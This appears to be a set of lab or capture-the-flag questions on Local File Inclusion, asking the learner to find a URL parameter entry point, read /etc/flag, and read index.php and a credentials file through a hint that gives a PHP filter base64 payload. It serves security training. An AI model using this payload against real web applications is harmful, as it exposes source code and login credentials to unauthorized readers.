LFI (Local File Inclusion)

Question 1: Deploy the attached VM and look around. What is the entry point for our web application? 
{Hint: Check parameters in the URL}

Question 2: Use the entry point to perform LFI to read the /etc/flag file. What is the flag?

Question 3: Use the PHP filter technique to read the source code of the index.php. What is the $flag variable's value?
{Hint: err=php://filter/convert.base64-encode/resource=index.php
Save the output to a text file.
"base64 --decode file.txt" to decode and get flag}

Question 4: Now that you read the index.php, there is a login credential PHP file's path. Use the PHP filter technique to read its content. 
What are the username and password?
